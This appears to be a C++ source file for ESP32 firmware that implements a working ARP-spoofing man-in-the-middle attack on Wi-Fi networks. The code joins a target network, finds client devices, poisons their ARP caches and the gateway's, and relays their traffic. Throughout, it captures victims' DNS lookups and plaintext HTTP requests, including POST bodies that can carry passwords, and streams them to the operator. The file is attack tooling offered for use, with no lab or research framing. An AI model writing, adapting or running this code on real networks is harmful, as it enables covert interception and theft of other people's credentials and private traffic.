// ============================================================
// FireGod-ESP — ARP-spoof MITM with full L2 relay
//
// Mechanism (lwIP IP_FORWARD is compiled OFF on this framework, so we
// bridge in software):
//   - esp_wifi_internal_reg_rxcb(WIFI_IF_STA, cb) hijacks every inbound
//     802.3 frame the STA driver delivers (frames addressed to our MAC;
//     the upstream AP hands them to us already decrypted).
//   - Frames genuinely for us (dst IP == our IP, ARP, broadcast) are
//     pushed back into the normal stack via esp_netif_receive(), so
//     DHCP and the dashboard keep working.
//   - Poisoned frames (dst IP != ours) are re-addressed at L2 and
//     re-injected with esp_wifi_internal_tx() toward their real next
//     hop (gateway for victim->net, the victim for net->victim).
//   - A poison task keeps the victim and gateway ARP caches pointing at
//     us. On stop we send corrective ARP to heal them.
//
// The RX callback runs in WiFi-task context, so it stays cheap: forward
// + shallow parse, dropping compact records into a spinlock-guarded ring
// that the module loop drains into JSON events.
// ============================================================

#include "mitm.h"
#include "fg_globals.h"
#include "core/wifi_manager.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <ctype.h>
#include <string.h>

extern "C" {
#include "esp_private/wifi.h"   // esp_wifi_internal_reg_rxcb / _tx / _free_rx_buffer
#include "esp_netif.h"          // esp_netif_receive / handle lookup
#include "lwip/netif.h"
#include "lwip/etharp.h"
#include "lwip/ip4_addr.h"
#include "lwip/tcpip.h"
}

#ifndef ARP_TABLE_SIZE
#define ARP_TABLE_SIZE 10
#endif

#define MITM_MAX_VICTIMS 16
#define MITM_RING_SIZE   24
#define MITM_POISON_MS   1500

// ---- victim record ----
struct Victim { uint32_t ip; uint8_t mac[6]; };   // ip in host order

// ---- capture record (callback-safe: no heap) ----
struct CapRec {
    uint8_t  type;        // 1 = DNS query, 2 = HTTP request
    uint32_t srcIp;       // host order
    char     host[64];    // DNS qname  OR  HTTP Host header
    char     req[160];    // HTTP "METHOD path"
    char     body[128];   // HTTP POST/PUT urlencoded body (else "")
};

// ---- module state (file scope) ----
static esp_netif_t* s_staNetif  = nullptr;
static uint8_t      s_ourMac[6] = {0};
static uint8_t      s_gwMac[6]  = {0};
static uint32_t     s_ourIp     = 0;   // host order
static uint32_t     s_gwIp      = 0;   // host order
static Victim       s_victims[MITM_MAX_VICTIMS];
static volatile int s_victimCount = 0;
static volatile bool s_bridging   = false;

// ring buffer (single producer = WiFi task cb, single consumer = module loop)
static CapRec        s_ring[MITM_RING_SIZE];
static volatile int  s_ringHead = 0;   // next write
static volatile int  s_ringTail = 0;   // next read
static portMUX_TYPE  s_ringMux  = portMUX_INITIALIZER_UNLOCKED;
static volatile uint32_t s_fwd  = 0;   // forwarded frame counter

// ---------- small helpers ----------
static void ip_to_str(uint32_t hostOrder, char* dst, size_t n) {
    snprintf(dst, n, "%u.%u.%u.%u",
             (unsigned)((hostOrder >> 24) & 0xFF), (unsigned)((hostOrder >> 16) & 0xFF),
             (unsigned)((hostOrder >> 8) & 0xFF), (unsigned)(hostOrder & 0xFF));
}

static inline bool is_victim_ip(uint32_t ip, int* idx) {
    for (int i = 0; i < s_victimCount; i++)
        if (s_victims[i].ip == ip) { if (idx) *idx = i; return true; }
    return false;
}

// JSON-escape into a bounded buffer; non-printables -> '.'
static void json_clean(const char* src, char* dst, size_t n) {
    size_t w = 0;
    for (size_t i = 0; src[i] && w < n - 1; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '"' || c == '\\') { if (w < n - 2) { dst[w++] = '\\'; dst[w++] = c; } }
        else if (c < 0x20 || c > 0x7E) dst[w++] = '.';
        else dst[w++] = (char)c;
    }
    dst[w] = '\0';
}

// ---------- ARP frame TX ----------
// Build + send a 42-byte ARP reply: "<spoofIp> is-at <srcMac>" to dstMac.
static void send_arp_reply(const uint8_t* dstMac, const uint8_t* srcMac,
                           uint32_t spoofIp, const uint8_t* targetMac, uint32_t targetIp) {
    uint8_t f[42];
    memcpy(f + 0, dstMac, 6);
    memcpy(f + 6, srcMac, 6);
    f[12] = 0x08; f[13] = 0x06;                 // ethertype ARP
    f[14] = 0x00; f[15] = 0x01;                 // htype ethernet
    f[16] = 0x08; f[17] = 0x00;                 // ptype IPv4
    f[18] = 6; f[19] = 4;                       // hlen / plen
    f[20] = 0x00; f[21] = 0x02;                 // oper = reply
    memcpy(f + 22, srcMac, 6);                  // sender MAC
    f[28] = (spoofIp >> 24) & 0xFF; f[29] = (spoofIp >> 16) & 0xFF;
    f[30] = (spoofIp >> 8) & 0xFF;  f[31] = spoofIp & 0xFF;
    memcpy(f + 32, targetMac, 6);               // target MAC
    f[38] = (targetIp >> 24) & 0xFF; f[39] = (targetIp >> 16) & 0xFF;
    f[40] = (targetIp >> 8) & 0xFF;  f[41] = targetIp & 0xFF;
    esp_wifi_internal_tx(WIFI_IF_STA, f, sizeof(f));
}

// Poison both halves for one victim: tell victim we're the gateway,
// tell the gateway we're the victim.
static void poison_victim(const Victim& v) {
    send_arp_reply(v.mac, s_ourMac, s_gwIp, v.mac, v.ip);   // -> victim: gw is-at us
    send_arp_reply(s_gwMac, s_ourMac, v.ip, s_gwMac, s_gwIp); // -> gw: victim is-at us
}

// Heal: restore the real mappings in both caches.
static void heal_victim(const Victim& v) {
    send_arp_reply(v.mac, s_gwMac, s_gwIp, v.mac, v.ip);    // -> victim: gw is-at real gw
    send_arp_reply(s_gwMac, v.mac, v.ip, s_gwMac, s_gwIp);  // -> gw: victim is-at real victim
}

// ---------- inline capture parsing (callback context) ----------
static void ring_push(const CapRec& r) {
    portENTER_CRITICAL(&s_ringMux);
    int next = (s_ringHead + 1) % MITM_RING_SIZE;
    if (next != s_ringTail) { s_ring[s_ringHead] = r; s_ringHead = next; }
    portEXIT_CRITICAL(&s_ringMux);
}

// p/plen = L4 payload; ipHdr at f+14. Cheap, bounded.
static void parse_capture(const uint8_t* f, int len, uint32_t srcIp) {
    if (len < 34) return;
    uint8_t ihl = (f[14] & 0x0F) * 4;
    if (ihl < 20) return;
    uint8_t proto = f[23];
    int l4 = 14 + ihl;
    if (l4 + 4 > len) return;

    if (proto == 17) {  // UDP
        uint16_t dport = (f[l4 + 2] << 8) | f[l4 + 3];
        uint16_t sport = (f[l4] << 8) | f[l4 + 1];
        if (dport != 53 && sport != 53) return;
        int dns = l4 + 8;
        if (dns + 12 > len) return;
        uint16_t flags = (f[dns + 2] << 8) | f[dns + 3];
        if (flags & 0x8000) return;          // responses only carry answers; want queries
        // parse first qname
        int q = dns + 12;
        CapRec r; r.type = 1; r.srcIp = srcIp; r.req[0] = r.body[0] = 0;
        size_t w = 0;
        while (q < len && f[q] != 0) {
            int lblLen = f[q++];
            if (lblLen <= 0 || lblLen > 63 || q + lblLen > len) break;
            if (w) { if (w < sizeof(r.host) - 1) r.host[w++] = '.'; }
            for (int i = 0; i < lblLen && w < sizeof(r.host) - 1; i++) {
                uint8_t c = f[q + i];
                r.host[w++] = isprint(c) ? (char)c : '.';
            }
            q += lblLen;
        }
        r.host[w] = '\0';
        if (w) ring_push(r);
        return;
    }

    if (proto == 6) {   // TCP
        uint16_t dport = (f[l4 + 2] << 8) | f[l4 + 3];
        if (dport != 80) return;
        uint8_t doff = ((f[l4 + 12] >> 4) & 0x0F) * 4;
        int pl = l4 + doff;
        int avail = len - pl;
        if (avail < 5) return;
        const char* p = (const char*)(f + pl);
        // request line must start with a known method
        static const char* M[] = {"GET ", "POST ", "PUT ", "HEAD ", "DELETE ",
                                   "OPTIONS ", "PATCH ", nullptr};
        const char* method = nullptr;
        for (int i = 0; M[i]; i++) {
            size_t ml = strlen(M[i]);
            if ((int)ml <= avail && memcmp(p, M[i], ml) == 0) { method = M[i]; break; }
        }
        if (!method) return;

        CapRec r; r.type = 2; r.srcIp = srcIp; r.host[0] = r.body[0] = 0;
        // request line up to CRLF (and strip trailing " HTTP/x.y")
        size_t w = 0;
        for (int i = 0; i < avail && p[i] != '\r' && p[i] != '\n' && w < sizeof(r.req) - 1; i++) {
            char c = p[i];
            r.req[w++] = (c >= 0x20 && c <= 0x7E) ? c : '.';
        }
        r.req[w] = '\0';
        char* httpTok = strstr(r.req, " HTTP/");
        if (httpTok) *httpTok = '\0';
        // Host header
        for (int i = 0; i + 6 < avail; i++) {
            if ((p[i] == 'H' || p[i] == 'h') && strncasecmp(p + i, "Host:", 5) == 0 &&
                (i == 0 || p[i - 1] == '\n')) {
                int j = i + 5; while (j < avail && p[j] == ' ') j++;
                size_t hw = 0;
                for (; j < avail && p[j] != '\r' && p[j] != '\n' && hw < sizeof(r.host) - 1; j++)
                    r.host[hw++] = (p[j] >= 0x20 && p[j] <= 0x7E) ? p[j] : '.';
                r.host[hw] = '\0';
                break;
            }
        }
        // body after blank line (POST/PUT only)
        if (method[0] == 'P') {
            for (int i = 0; i + 4 <= avail; i++) {
                if (p[i] == '\r' && p[i + 1] == '\n' && p[i + 2] == '\r' && p[i + 3] == '\n') {
                    int j = i + 4; size_t bw = 0;
                    for (; j < avail && bw < sizeof(r.body) - 1; j++)
                        r.body[bw++] = (p[j] >= 0x20 && p[j] <= 0x7E) ? p[j] : '.';
                    r.body[bw] = '\0';
                    break;
                }
            }
        }
        ring_push(r);
    }
}

// ---------- the L2 bridge (WiFi-task context) ----------
static esp_err_t mitm_rx(void* buffer, uint16_t len, void* eb) {
    uint8_t* f = (uint8_t*)buffer;

    // Pass non-IPv4, broadcast/multicast, and too-short frames straight up.
    if (!s_bridging || len < 34 || (f[0] & 0x01) ||
        f[12] != 0x08 || f[13] != 0x00) {
        return esp_netif_receive(s_staNetif, buffer, len, eb);
    }

    uint32_t srcIp = ((uint32_t)f[26] << 24) | ((uint32_t)f[27] << 16) |
                     ((uint32_t)f[28] << 8) | f[29];
    uint32_t dstIp = ((uint32_t)f[30] << 24) | ((uint32_t)f[31] << 16) |
                     ((uint32_t)f[32] << 8) | f[33];

    if (dstIp == s_ourIp) {                 // genuinely for us
        return esp_netif_receive(s_staNetif, buffer, len, eb);
    }

    // Decide next hop.
    uint8_t nextMac[6];
    int vi;
    if (is_victim_ip(srcIp, &vi)) {         // victim -> internet : send to real gateway
        memcpy(nextMac, s_gwMac, 6);
        parse_capture(f, len, srcIp);
    } else if (is_victim_ip(dstIp, &vi)) {  // internet -> victim : send to victim
        memcpy(nextMac, s_victims[vi].mac, 6);
    } else {
        return esp_netif_receive(s_staNetif, buffer, len, eb);  // not ours to relay
    }

    // Re-address at L2 and forward; free the rx buffer ourselves.
    memcpy(f + 0, nextMac, 6);
    memcpy(f + 6, s_ourMac, 6);
    esp_wifi_internal_tx(WIFI_IF_STA, buffer, len);
    s_fwd++;
    esp_wifi_internal_free_rx_buffer(eb);
    return ESP_OK;
}

// ---------- resolve an IP -> MAC via the lwIP ARP cache ----------
static bool resolve_mac(struct netif* nif, uint32_t ipHost, uint8_t out[6]) {
    ip4_addr_t tgt; ip4_addr_set_u32(&tgt, lwip_htonl(ipHost));
    for (int attempt = 0; attempt < 10 && !g_stopRequested; attempt++) {
        struct eth_addr* eth = nullptr; const ip4_addr_t* found = nullptr;
        LOCK_TCPIP_CORE();
        s8_t r = etharp_find_addr(nif, &tgt, &eth, &found);
        UNLOCK_TCPIP_CORE();
        if (r >= 0 && eth) { memcpy(out, eth->addr, 6); return true; }
        LOCK_TCPIP_CORE();
        etharp_request(nif, &tgt);
        UNLOCK_TCPIP_CORE();
        vTaskDelay(pdMS_TO_TICKS(120));
    }
    return false;
}

// Discover up to MITM_MAX_VICTIMS clients on the /24 into s_victims.
static void discover_clients(struct netif* nif, uint32_t base) {
    const int BATCH = 8;
    for (int start = 1; start <= 254 && !g_stopRequested &&
                        s_victimCount < MITM_MAX_VICTIMS; start += BATCH) {
        for (int h = start; h < start + BATCH && h <= 254; h++) {
            uint32_t ip = (base & 0xFFFFFF00) | (uint32_t)h;
            if (ip == s_ourIp || ip == s_gwIp) continue;
            ip4_addr_t t; ip4_addr_set_u32(&t, lwip_htonl(ip));
            LOCK_TCPIP_CORE(); etharp_request(nif, &t); UNLOCK_TCPIP_CORE();
            vTaskDelay(pdMS_TO_TICKS(8));
        }
        vTaskDelay(pdMS_TO_TICKS(220));
        for (int i = 0; i < ARP_TABLE_SIZE && s_victimCount < MITM_MAX_VICTIMS; i++) {
            ip4_addr_t* ip = nullptr; struct netif* en = nullptr; struct eth_addr* eth = nullptr;
            LOCK_TCPIP_CORE();
            s8_t valid = etharp_get_entry(i, &ip, &en, &eth);
            UNLOCK_TCPIP_CORE();
            if (!valid || !ip || !eth || en != nif) continue;
            uint32_t hip = lwip_ntohl(ip4_addr_get_u32(ip));
            if (hip == s_ourIp || hip == s_gwIp) continue;
            int dummy;
            if (is_victim_ip(hip, &dummy)) continue;
            Victim& v = s_victims[s_victimCount];
            v.ip = hip; memcpy(v.mac, eth->addr, 6);
            char ipStr[16]; ip_to_str(hip, ipStr, sizeof(ipStr));
            fg_send_result_fmt("{\"event\":\"mitm_target\",\"ip\":\"%s\",\"mac\":\"%s\",\"vendor\":\"%s\"}",
                               ipStr, fg_mac_to_str(v.mac).c_str(), fg_oui_vendor(v.mac));
            s_victimCount++;
        }
    }
}

// ---------- drain captures -> JSON events ----------
static void drain_captures() {
    for (;;) {
        CapRec r; bool got = false;
        portENTER_CRITICAL(&s_ringMux);
        if (s_ringTail != s_ringHead) { r = s_ring[s_ringTail]; s_ringTail = (s_ringTail + 1) % MITM_RING_SIZE; got = true; }
        portEXIT_CRITICAL(&s_ringMux);
        if (!got) break;

        char ipStr[16]; ip_to_str(r.srcIp, ipStr, sizeof(ipStr));
        char host[128], req[200], body[160];
        json_clean(r.host, host, sizeof(host));
        if (r.type == 1) {
            fg_send_result_fmt("{\"event\":\"mitm_dns\",\"ip\":\"%s\",\"host\":\"%s\"}",
                               ipStr, host);
        } else {
            json_clean(r.req, req, sizeof(req));
            json_clean(r.body, body, sizeof(body));
            fg_send_result_fmt(
                "{\"event\":\"mitm_http\",\"ip\":\"%s\",\"host\":\"%s\",\"req\":\"%s\",\"data\":\"%s\"}",
                ipStr, host, req, body);
        }
        vTaskDelay(pdMS_TO_TICKS(3));
    }
}

// ============================================================
// Module entry
// ============================================================
void fg_mitm(const char* ssid, const char* pass, const char* target) {
    if (!ssid || !ssid[0]) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"mitm requires target ssid\"}");
        return;
    }
    s_victimCount = 0; s_bridging = false; s_ringHead = s_ringTail = 0; s_fwd = 0;

    fg_send_result_fmt("{\"event\":\"log\",\"msg\":\"MITM: joining %s...\"}", ssid);
    if (!fg_wifi_connect_sta(ssid, pass)) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"STA connect failed\"}");
        fg_wifi_disconnect_sta();
        return;
    }

    s_staNetif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_wifi_get_mac(WIFI_IF_STA, s_ourMac);
    s_ourIp = lwip_ntohl((uint32_t)WiFi.localIP());
    s_gwIp  = lwip_ntohl((uint32_t)WiFi.gatewayIP());
    uint32_t mask = lwip_ntohl((uint32_t)WiFi.subnetMask());
    uint32_t base = s_ourIp & mask;

    struct netif* nif = nullptr;
    for (struct netif* n = netif_list; n; n = n->next) {
        const ip4_addr_t* a = netif_ip4_addr(n);
        if (a && lwip_ntohl(ip4_addr_get_u32(a)) == s_ourIp) { nif = n; break; }
    }
    if (!s_staNetif || !nif || !s_gwIp) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"MITM: STA netif/gateway unavailable\"}");
        fg_wifi_disconnect_sta();
        return;
    }

    if (!resolve_mac(nif, s_gwIp, s_gwMac)) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"MITM: could not resolve gateway MAC\"}");
        fg_wifi_disconnect_sta();
        return;
    }
    { char g[16]; ip_to_str(s_gwIp, g, sizeof(g));
      fg_send_result_fmt("{\"event\":\"log\",\"msg\":\"Gateway %s @ %s\"}",
                         g, fg_mac_to_str(s_gwMac).c_str()); }

    // Build victim list.
    bool all = (!target || !target[0] || strcasecmp(target, "all") == 0);
    if (all) {
        fg_send_result("{\"event\":\"log\",\"msg\":\"MITM: discovering clients...\"}");
        discover_clients(nif, base);
    } else {
        IPAddress tip; uint32_t tHost = 0;
        if (tip.fromString(target)) tHost = lwip_ntohl((uint32_t)tip);
        if (!tHost) {
            fg_send_result("{\"event\":\"error\",\"msg\":\"MITM: bad target IP\"}");
            fg_wifi_disconnect_sta();
            return;
        }
        uint8_t mac[6];
        if (!resolve_mac(nif, tHost, mac)) {
            fg_send_result("{\"event\":\"error\",\"msg\":\"MITM: target unreachable (no ARP)\"}");
            fg_wifi_disconnect_sta();
            return;
        }
        s_victims[0].ip = tHost; memcpy(s_victims[0].mac, mac, 6); s_victimCount = 1;
        char ipStr[16]; ip_to_str(tHost, ipStr, sizeof(ipStr));
        fg_send_result_fmt("{\"event\":\"mitm_target\",\"ip\":\"%s\",\"mac\":\"%s\",\"vendor\":\"%s\"}",
                           ipStr, fg_mac_to_str(mac).c_str(), fg_oui_vendor(mac));
    }

    if (s_victimCount == 0) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"MITM: no victims found\"}");
        fg_wifi_disconnect_sta();
        return;
    }

    // Engage the bridge + start poisoning.
    esp_wifi_internal_reg_rxcb(WIFI_IF_STA, mitm_rx);
    s_bridging = true;
    fg_send_result_fmt("{\"event\":\"log\",\"msg\":\"MITM active on %d client(s). Forwarding...\"}",
                       s_victimCount);

    uint32_t lastPoison = 0, lastStat = 0;
    while (!g_stopRequested) {
        uint32_t now = millis();
        if (now - lastPoison >= MITM_POISON_MS) {
            lastPoison = now;
            for (int i = 0; i < s_victimCount; i++) poison_victim(s_victims[i]);
        }
        if (now - lastStat >= 2000) {
            lastStat = now;
            fg_send_result_fmt("{\"event\":\"mitm_stats\",\"victims\":%d,\"fwd\":%lu}",
                               s_victimCount, (unsigned long)s_fwd);
        }
        drain_captures();
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // ---- teardown: stop bridging, heal ARP caches, restore AP ----
    s_bridging = false;
    esp_wifi_internal_reg_rxcb(WIFI_IF_STA, NULL);
    fg_send_result("{\"event\":\"log\",\"msg\":\"MITM: healing ARP caches...\"}");
    for (int round = 0; round < 5; round++) {
        for (int i = 0; i < s_victimCount; i++) heal_victim(s_victims[i]);
        vTaskDelay(pdMS_TO_TICKS(120));
    }
    drain_captures();
    fg_send_result_fmt("{\"event\":\"scan_complete\",\"type\":\"mitm\",\"count\":%lu}",
                       (unsigned long)s_fwd);
    fg_wifi_disconnect_sta();
    fg_send_result("{\"event\":\"log\",\"msg\":\"MITM stopped, AP restored.\"}");
}
